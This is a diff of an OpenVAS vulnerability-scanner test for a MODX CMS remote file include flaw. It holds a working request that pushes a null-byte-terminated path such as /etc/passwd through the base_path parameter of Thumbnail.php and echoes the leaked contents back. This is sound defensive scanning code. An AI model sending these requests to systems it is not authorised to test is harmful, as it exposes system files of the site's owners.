@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: modx_0921_rfi.nasl 5889 2017-04-07 09:14:58Z cfi $
+# $Id: modx_0921_rfi.nasl 11669 2018-09-28 08:44:24Z jschulte $
 #
 # MODX CMS base_path Parameter Remote File Include Vulnerability
 #
@@ -8,7 +8,7 @@
 # Justin Seitz <jms@bughunter.ca>
 #
 # Copyright:
-# Copyright (C) 2006 Justin Seitz
+# Copyright (C) 2008 Justin Seitz
 #
 # This program is free software; you can redistribute it and/or modify
 # it under the terms of the GNU General Public License version 2,
@@ -27,8 +27,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.80072");
-  script_version("$Revision: 5889 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-04-07 11:14:58 +0200 (Fri, 07 Apr 2017) $");
+  script_version("$Revision: 11669 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-28 10:44:24 +0200 (Fri, 28 Sep 2018) $");
   script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
   script_tag(name:"cvss_base", value:"5.1");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
@@ -37,33 +37,25 @@ if(description)
   script_xref(name:"OSVDB", value:"30186");
   script_name("MODX CMS base_path Parameter Remote File Include Vulnerability");
   script_category(ACT_ATTACK);
-  script_copyright("This script is Copyright (C) 2006 Justin Seitz");
+  script_copyright("This script is Copyright (C) 2008 Justin Seitz");
   script_family("Web application abuses");
-  script_dependencies("gb_modx_cms_detect.nasl");
+  script_dependencies("gb_modx_cms_detect.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
   script_mandatory_keys("modx_cms/installed");
 
   script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/2706");
-  script_xref(name:"URL", value:"http://modxcms.com/forums/index.php/topic,8604.0.html");
+  script_xref(name:"URL", value:"http://modxcms.com/forums/index.php/topic, 8604.0.html");
 
-  tag_summary = "The remote web server is running MODX CMS, an open source content
-  management system which is affected by a remote file include issue.";
-
-  tag_insight = "The version of MODX CMS installed on the remote host fails to sanitize
+  script_tag(name:"summary", value:"The remote web server is running MODX CMS, an open source content
+  management system which is affected by a remote file include issue.");
+  script_tag(name:"insight", value:"The version of MODX CMS installed on the remote host fails to sanitize
   input to the 'base_path' parameter before using it in the
   'manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php'
-  script to include PHP code.";
-
-  tag_impact = "Provided PHP's 'register_globals' setting is enabled, an unauthenticated
+  script to include PHP code.");
+  script_tag(name:"impact", value:"Provided PHP's 'register_globals' setting is enabled, an unauthenticated
   attacker can exploit this issue to view arbitrary files and execute arbitrary code,
-  possibly taken from third-party hosts, on the remote host.";
-
-  tag_solution = "Update to version 0.9.2.2 or later.";
-
-  script_tag(name:"summary", value:tag_summary);
-  script_tag(name:"insight", value:tag_insight);
-  script_tag(name:"impact", value:tag_impact);
-  script_tag(name:"solution", value:tag_solution);
+  possibly taken from third-party hosts, on the remote host.");
+  script_tag(name:"solution", value:"Update to version 0.9.2.2 or later.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_app");
@@ -74,6 +66,7 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
+include("misc_func.inc");
 
 cpe_list = make_list( "cpe:/a:modx:unknown",
                       "cpe:/a:modx:revolution",
@@ -85,35 +78,40 @@ port = infos['port'];
 
 if( ! dir = get_app_location( cpe:cpe, port:port ) ) exit( 0 );
 
-file = "/etc/passwd";
+files = traversal_files();
 
-if( dir == "/" ) dir = "";
-url = string(dir, "/manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php?base_path=", file, "%00");
-req = http_get( item:url, port:port );
-res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
-if( isnull( res ) ) exit( 0 );
+foreach pattern( keys( files ) ) {
 
-if( egrep( pattern:"root:.*:0:[01]:", string:res ) ||
-    string( "main(", file, "\\0manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php): failed to open stream" ) >< res ||
-    string( "main(", file, "): failed to open stream: No such file" ) >< res ||
-    "open_basedir restriction in effect. File(" >< res )	{
+  file = "/" + files[pattern];
 
-  passwd = NULL;
-  if( egrep( pattern:"root:.*:0:[01]:", string:res ) ) {
-    passwd = res;
-    if( "<br" >< passwd ) passwd = passwd - strstr(passwd, "<br");
+  if( dir == "/" ) dir = "";
+  url = string( dir, "/manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php?base_path=", file, "%00" );
+  req = http_get( item:url, port:port );
+  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
+  if( isnull( res ) ) exit( 0 );
+
+  if( egrep( pattern:pattern, string:res ) ||
+      string( "main(", file, "\\0manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php): failed to open stream" ) >< res ||
+      string( "main(", file, "): failed to open stream: No such file" ) >< res ||
+      "open_basedir restriction in effect. File(" >< res )	{
+
+    passwd = NULL;
+    if( egrep( pattern:pattern, string:res ) ) {
+      passwd = res;
+      if( "<br" >< passwd ) passwd = passwd - strstr(passwd, "<br");
+    }
+
+    if( passwd ) {
+      info = string( "The version of MODX CMS installed in directory '", dir, "'\n",
+                     "is vulnerable to this issue. Here is the contents of " + file + "\n",
+                     "from the remote host :\n\n", passwd );
+    } else {
+      info = "";
+    }
+
+    security_message( data:info, port:port );
+    exit( 0 );
   }
-
-  if( passwd ) {
-    info = string( "The version of MODX CMS installed in directory '", dir, "'\n",
-                   "is vulnerable to this issue. Here is the contents of /etc/passwd\n",
-                   "from the remote host :\n\n", passwd );
-  } else {
-    info = "";
-  }
-
-  security_message( data:info, port:port );
-  exit( 0 );
 }
 
 exit( 99 );
